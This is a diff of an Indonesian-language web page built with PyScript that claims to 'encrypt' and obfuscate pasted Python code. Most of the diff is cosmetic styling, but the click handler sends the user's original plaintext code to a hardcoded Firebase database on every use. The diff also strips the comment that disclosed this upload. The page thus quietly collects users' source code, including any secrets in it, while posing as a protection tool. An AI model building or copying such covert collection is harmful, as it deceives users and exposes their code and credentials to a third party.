@@ -3,11 +3,12 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>C PYTHON <=</title>
-    <!-- Firebase (opsional, jika ingin mengirim kode asli ke Firebase) -->
+    <title>ENC PYTHON <= - Enkripsi Modern</title>
+    <!-- Firebase (opsional) -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script>
+      // Konfigurasi Firebase (ubah sesuai kebutuhan Anda)
       var firebaseConfig = {
         apiKey: "AIzaSyDIOjpEtWakfh0WNCDC1iPj9Qm5zKDlaL4",
         authDomain: "login-24767.firebaseapp.com",
@@ -28,90 +29,144 @@
       }
     </script>
 
-    <!-- Sertakan PyScript -->
+    <!-- Sertakan PyScript (gunakan versi rilis tertentu untuk stabilitas) -->
     <link rel="stylesheet" href="https://pyscript.net/releases/2022.12.1/pyscript.css" />
     <script defer src="https://pyscript.net/releases/2022.12.1/pyscript.js"></script>
 
     <style>
+      /* Animasi latar belakang gradient */
       body {
         margin: 0;
         padding: 0;
-        background: #121212;
-        color: #e0e0e0;
-        font-family: Arial, sans-serif;
         display: flex;
         justify-content: center;
         align-items: center;
         min-height: 100vh;
+        font-family: 'Roboto', sans-serif;
+        color: #fff;
+        background: linear-gradient(45deg, #1f4037, #99f2c8);
+        background-size: 400% 400%;
+        animation: gradientBG 15s ease infinite;
       }
+      @keyframes gradientBG {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
+      }
+      /* Container utama dengan animasi fadeIn */
       .container {
-        background: #1e1e1e;
-        border-radius: 12px;
-        padding: 20px 30px;
-        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+        background: rgba(0, 0, 0, 0.7);
+        border-radius: 15px;
+        padding: 30px;
+        box-shadow: 0 8px 16px rgba(0, 0, 0, 0.8);
         width: 90%;
-        max-width: 600px;
+        max-width: 800px;
+        position: relative;
+        overflow: hidden;
+        animation: fadeIn 1s ease;
+      }
+      @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
       }
       h2 {
         text-align: center;
         margin-bottom: 20px;
-        font-size: 2em;
+        font-size: 2.5em;
+        letter-spacing: 2px;
+        text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.5);
       }
       textarea {
         width: 100%;
         height: 200px;
-        background: #2e2e2e;
-        border: none;
-        border-radius: 8px;
-        padding: 10px;
-        color: #e0e0e0;
-        font-family: monospace;
+        background: rgba(255, 255, 255, 0.1);
+        border: 2px solid rgba(255, 255, 255, 0.3);
+        border-radius: 10px;
+        padding: 15px;
+        color: #fff;
+        font-family: 'Courier New', monospace;
         font-size: 1em;
-        resize: vertical;
+        transition: border 0.3s ease, transform 0.3s ease;
+      }
+      textarea:focus {
+        border-color: #00e676;
+        transform: scale(1.02);
       }
       button {
         display: inline-block;
-        background: #0066cc;
+        background: linear-gradient(45deg, #00e676, #00bfa5);
         border: none;
-        color: #fff;
-        padding: 10px 20px;
+        padding: 12px 25px;
         border-radius: 8px;
+        color: #fff;
+        font-size: 1.2em;
         cursor: pointer;
-        font-size: 1em;
-        margin-top: 10px;
-        transition: background 0.3s ease;
+        transition: transform 0.2s ease, box-shadow 0.2s ease;
+        margin-top: 15px;
       }
       button:hover {
-        background: #005bb5;
+        transform: scale(1.05);
+        box-shadow: 0 0 15px rgba(0, 230, 118, 0.7);
       }
       .result-section {
-        margin-top: 20px;
+        margin-top: 25px;
       }
       .result-section h3 {
-        margin: 10px 0;
-        font-size: 1.2em;
         text-align: center;
+        margin-bottom: 10px;
+        font-size: 1.5em;
+        text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.7);
       }
       #output {
-        background: #2e2e2e;
-        border-radius: 8px;
-        padding: 10px;
-        min-height: 100px;
-        font-family: monospace;
+        background: rgba(0, 0, 0, 0.5);
+        border-radius: 10px;
+        padding: 15px;
+        min-height: 120px;
+        font-family: 'Courier New', monospace;
+        font-size: 1em;
         word-wrap: break-word;
+        white-space: pre-wrap;
+        overflow-y: auto;
+        max-height: 300px;
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        transition: background 0.3s ease;
+      }
+      #output:hover {
+        background: rgba(0, 0, 0, 0.7);
       }
       .copy-button {
-        background: #cc6600;
+        background: linear-gradient(45deg, #ff5252, #ff1744);
+        margin-top: 15px;
       }
       .copy-button:hover {
-        background: #b35900;
+        transform: scale(1.05);
+        box-shadow: 0 0 15px rgba(255, 82, 82, 0.7);
+      }
+      /* Spinner loading */
+      .spinner {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 50px;
+        height: 50px;
+        border: 6px solid rgba(255, 255, 255, 0.3);
+        border-top: 6px solid #00e676;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        display: none;
+        z-index: 10;
+      }
+      @keyframes spin {
+        0% { transform: translate(-50%, -50%) rotate(0deg); }
+        100% { transform: translate(-50%, -50%) rotate(360deg); }
       }
     </style>
   </head>
   <body>
     <div class="container">
+      <div class="spinner" id="spinner"></div>
       <h2>C PYTHON <=</h2>
-      <!-- Tempel script Python di sini... -->
       <textarea id="codeInput" placeholder="Tempel script Python di sini..."></textarea>
       <button id="encryptButton">ENC GAS</button>
       <div class="result-section">
@@ -121,7 +176,7 @@
       </div>
     </div>
 
-    <!-- PyScript: Kode Python untuk enkripsi dan obfuscation -->
+    <!-- PyScript: Kode Python Modular dengan Animasi dan UI Keren -->
     <py-script>
 import asyncio
 import uuid
@@ -157,11 +212,18 @@ async def main():
         return header + encrypted_hex
 
     def on_encrypt(event):
+        # Tampilkan spinner selama proses enkripsi
+        js.document.getElementById("spinner").style.display = "block"
         code = js.document.getElementById("codeInput").value
+        if not code.strip():
+            js.document.getElementById("output").innerText = "Input kosong!"
+            js.document.getElementById("spinner").style.display = "none"
+            return
         identifier = str(uuid.uuid4())
         js.sendToFirebase(identifier, code)
         obfuscated = obfuscate_code(code)
         js.document.getElementById("output").innerText = obfuscated
+        js.document.getElementById("spinner").style.display = "none"
 
     js.document.getElementById("encryptButton").addEventListener("click", on_encrypt)
 
